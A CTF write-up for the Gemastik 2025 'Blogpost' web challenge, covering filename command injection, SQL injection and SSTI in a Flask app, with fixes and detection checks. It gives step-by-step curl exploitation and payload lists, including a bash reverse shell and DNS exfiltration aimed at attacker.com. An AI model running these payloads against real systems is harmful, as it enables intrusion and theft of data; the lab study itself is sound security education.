# Quick Reference - Blogpost CTF Challenge

## TL;DR - The Vulnerability

**Command Injection in image upload via filename**

```python
# VULNERABLE CODE (app.py:132)
cmd = f"exiftool {save_path}"  # save_path contains user-controlled filename
os.system(full_cmd)  # Executes in shell
```

**Exploit**: Upload image with filename containing shell commands to execute arbitrary code and steal the flag.

## Quick Exploit

```bash
# 1. Run the solve script
python3 dapur.py <target-ip> <port>

# 2. Script will output the flag
GEMASTIK{...64-hex-chars...}
```

## Manual Exploitation Steps

### 1. Register & Login

```bash
curl -X POST http://target:port/register \
  -d "username=hacker&password=password123"

curl -X POST http://target:port/login \
  -d "username=hacker&password=password123" \
  -c cookies.txt
```

### 2. Upload Legitimate Image

```bash
# Create a small PNG
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' > seed.png

curl -X POST http://target:port/create \
  -b cookies.txt \
  -F "title=test" \
  -F "content=test" \
  -F "image=@seed.png"
```

### 3. Get Target Hash

```bash
# View homepage and extract the image hash
curl http://target:port/ -b cookies.txt | grep -oP '/uploads/\K[0-9a-f]{64}\.png'
# Example output: a1b2c3d4...xyz.png
```

### 4. Inject Command

```bash
TARGET="a1b2c3d4...xyz.png"  # From step 3

# Create malicious filename
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' > payload.png

curl -X POST http://target:port/create \
  -b cookies.txt \
  -F "title=exploit" \
  -F "content=exploit" \
  -F "image=@payload.png;filename=x.png; cp \$(printf '\\057app\\057flag.txt') \$(printf '\\057app\\057uploads\\057${TARGET}') #.png"
```

### 5. Retrieve Flag

```bash
curl http://target:port/uploads/$TARGET -b cookies.txt
# Output: GEMASTIK{...}
```

## Code Vulnerability Details

### 🔴 Command Injection (CRITICAL)

```python:126:135:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
if file and allowed_file(file.filename):
    original_filename = file.filename  # ⚠️ User-controlled
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], original_filename)
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    file.save(save_path)

    try:
        cmd = f"exiftool {save_path}"  # ⚠️ Direct injection
        meta_file = save_path + ".meta"
        full_cmd = f"{cmd} > {meta_file} 2>&1"
        os_status = os.system(full_cmd)  # ⚠️ Shell execution
```

**Issue**:

- No sanitization of `file.filename`
- Direct use in shell command
- `os.system()` uses shell (`/bin/sh -c`)

**Fix**:

```python
# Use subprocess without shell
import subprocess
result = subprocess.run(['exiftool', save_path],
                       capture_output=True,
                       text=True)
metadata_text = result.stdout
```

### 🟠 SQL Injection (HIGH)

```python:193:194:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)
```

**Issue**:

- `metadata_text` from exiftool output (file contents)
- Direct string formatting into SQL
- `executescript()` allows multiple statements

**Fix**:

```python
# Use parameterized query
db.execute("UPDATE posts SET metadata = ? WHERE id = ?",
           (metadata_text, post_id))
```

### 🟡 SSTI - Server Side Template Injection (MEDIUM)

```python:245:257:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
with open(os.path.join(APP_DIR, "templates", "profile.html"), "r", encoding="utf-8") as fh:
    profile_template = fh.read()

username = user["username"] if user else ""
profile_source = profile_template.replace("{{ user.username }}", username)  # ⚠️ Direct replace

# ... later ...
return render_template_string(profile_source, user=user, flag=flag_content)  # ⚠️ Template rendering
```

**Issue**:

- Username directly replaced in template string
- Could inject Jinja2 syntax: `{{ config }}`
- Then rendered with `render_template_string()`

**Fix**:

```python
# Just use render_template normally
return render_template("profile.html", user=user, flag=flag_content)
# The template engine will properly escape user.username
```

## Payload Variations

### Basic Payloads

```bash
# Simple command execution
x.png; id > /app/uploads/target.png #.png

# Copy flag
x.png; cp /app/flag.txt /app/uploads/target.png #.png

# Cat flag
x.png; cat /app/flag.txt > /app/uploads/target.png #.png
```

### Obfuscated Payloads

```bash
# Using printf for path (bypass filters)
x.png; cp $(printf '\057app\057flag.txt') $(printf '\057app\057uploads\057target.png') #.png

# Using octal for all slashes
x.png; cp $(printf '\057app\057flag\056txt') $(printf '\057app\057uploads\057target\056png') #.png

# Using hex encoding
x.png; cp $(printf '\x2fapp\x2fflag.txt') $(printf '\x2fapp\x2fuploads\x2ftarget.png') #.png
```

### Advanced Payloads

```bash
# Base64 encode flag (if contains binary)
x.png; base64 /app/flag.txt > /app/uploads/target.png #.png

# Reverse shell (if needed for further access)
x.png; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #.png

# Exfiltrate via DNS
x.png; cat /app/flag.txt | base64 | xargs -I {} nslookup {}.attacker.com #.png

# Multiple commands
x.png; cat /app/flag.txt > /tmp/f1; cp /tmp/f1 /app/uploads/target.png; rm /tmp/f1 #.png
```

## Key Files

| File               | Purpose                                           |
| ------------------ | ------------------------------------------------- |
| `app.py`           | Main Flask application (contains vulnerabilities) |
| `dapur.py`         | Working exploit script                            |
| `init_db.sql`      | Database schema                                   |
| `entrypoint.sh`    | Generates random flag on startup                  |
| `requirements.txt` | Python dependencies                               |

## Flag Location

```bash
# On server
/app/flag.txt  (chmod 400, root owned)

# Format
GEMASTIK{<64-hex-chars>}

# Example
GEMASTIK{a1b2c3d4e5f6789012345678901234567890abcdefabcdefabcdefabcdef1234}
```

## Important Functions

### `allowed_file()` - File Extension Check

```python:111:112:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXT
```

- Only checks extension, not full filename
- Allows: png, jpg, jpeg, bmp
- **Bypassed**: Filename can contain anything before extension

### `uploaded_file()` - Authorization Check

```python:208:219:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    if "user_id" not in session:
        return redirect(url_for("login"))
    if ".." in filename or filename.startswith("/"):
        abort(404)
    db = get_db()
    cur = db.execute("SELECT id FROM posts WHERE image_filename = ? AND author_id = ?",
                     (filename, session["user_id"]))
    row = cur.fetchone()
    if not row:
        abort(404)
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
```

- Checks if file belongs to current user
- **Bypassed**: We overwrite our own file with flag content

### `profile()` - Flag Display

```python:235:257:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
@app.route("/profile")
def profile():
    if "user_id" not in session:
        flash("Login required")
        return redirect(url_for("login"))
    db = get_db()
    cur = db.execute("SELECT id, username, role FROM users WHERE id = ?", (session["user_id"],))
    user = cur.fetchone()
    flag_content = None

    with open(os.path.join(APP_DIR, "templates", "profile.html"), "r", encoding="utf-8") as fh:
        profile_template = fh.read()

    username = user["username"] if user else ""
    profile_source = profile_template.replace("{{ user.username }}", username)

    if user and user["role"] == "admin":
        try:
            with open(FLAG_PATH, "r") as f:
                flag_content = f.read().strip()
        except Exception:
            flag_content = "flag not found"
    return render_template_string(profile_source, user=user, flag=flag_content)
```

- Flag only shown to admin users
- Normal users have role='user'
- **Bypassed**: We don't need admin; we steal flag via command injection

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                  Docker Container                    │
│                                                      │
│  ┌────────────────────────────────────────────┐    │
│  │ Flask App (Python 3.11)                     │    │
│  │ - Running on 0.0.0.0:8000                  │    │
│  │ - /app/app.py                              │    │
│  └────────────────────────────────────────────┘    │
│                                                      │
│  ┌────────────────────────────────────────────┐    │
│  │ SQLite Database                             │    │
│  │ - /data/app.db                             │    │
│  │ - Tables: users, posts                     │    │
│  └────────────────────────────────────────────┘    │
│                                                      │
│  ┌────────────────────────────────────────────┐    │
│  │ File System                                 │    │
│  │ - /app/flag.txt (chmod 400)                │    │
│  │ - /app/uploads/ (uploaded images)          │    │
│  │ - /app/templates/ (HTML templates)         │    │
│  └────────────────────────────────────────────┘    │
│                                                      │
│  ┌────────────────────────────────────────────┐    │
│  │ exiftool (libimage-exiftool-perl)          │    │
│  │ - Reads image metadata                     │    │
│  │ - Called via os.system() ⚠️                │    │
│  └────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────┘
```

## Testing Checklist

- [ ] Can register new user
- [ ] Can login with credentials
- [ ] Can create post with image
- [ ] Can view own posts
- [ ] Image hash is calculated correctly
- [ ] Can search posts
- [ ] Can upload malicious filename
- [ ] Command injection executes
- [ ] Flag is copied to target location
- [ ] Can retrieve flag from uploads endpoint

## Common Issues

### Issue: "Could not find our post"

**Solution**: Increase retry count or search delay in dapur.py

### Issue: "Image fetch failed"

**Solution**: Check if target hash was extracted correctly

### Issue: "Permission denied"

**Solution**: Flag file has chmod 400 but cp/cat should still work as same user

### Issue: "No flag in output"

**Solution**:

- Check if command executed (add `;ls>/tmp/test` to verify)
- Try cat instead of cp
- Increase retry attempts
- Check file permissions in container

## Defense Detection

### Indicators of Compromise (IOCs)

1. **Suspicious filenames in uploads**

   ```bash
   # Look for filenames with shell metacharacters
   ls /app/uploads/ | grep -E '[;|&$()]'
   ```

2. **Unusual database entries**

   ```sql
   SELECT * FROM posts WHERE image_filename LIKE '%;%';
   ```

3. **Modified upload timestamps**

   ```bash
   # Check if upload file modified after creation
   find /app/uploads -type f -mmin -1
   ```

4. **Process execution logs**
   ```bash
   # Check for unusual child processes of Flask
   ps aux | grep -E 'cp|cat|bash'
   ```

## References

- **CWE-78**: OS Command Injection
- **CWE-89**: SQL Injection
- **CWE-94**: Code Injection (SSTI)
- **OWASP Top 10**: A03:2021 – Injection

## Credits

Challenge: Gemastik 2025 Final - Blogpost  
Exploit Script: `dapur.py` (provided solve script)

